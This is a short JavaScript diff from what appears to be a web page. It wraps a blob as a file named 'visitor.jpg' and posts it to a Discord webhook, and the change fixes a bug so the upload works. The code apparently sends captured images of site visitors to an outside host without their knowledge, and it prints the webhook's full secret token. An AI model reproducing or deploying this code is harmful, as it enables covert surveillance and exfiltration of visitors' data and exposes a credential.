@@ -174,11 +174,8 @@
     var file = new File([blob],
      'visitor.jpg');
     
-    var text = new text([blob],
-     'test');
-    
     var formData = new FormData();
-    formData.append('file', file, text);
+    formData.append('file', file);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
